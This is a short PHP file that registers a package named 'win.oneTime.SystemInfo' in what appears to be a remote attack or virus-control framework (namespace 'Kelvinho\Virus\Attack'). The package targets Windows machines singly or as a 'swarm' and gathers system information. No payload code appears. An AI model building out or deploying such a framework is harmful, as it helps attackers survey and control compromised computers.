<?php

use Kelvinho\Virus\Attack\Classes;
use Kelvinho\Virus\Attack\PackageRegistrar;

PackageRegistrar::register("win.oneTime.SystemInfo", "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\SystemInfo", "easy.SystemInfo", __DIR__, [Classes::WINDOWS_ALONE, Classes::WINDOWS_SWARM], "Get some basic system information.");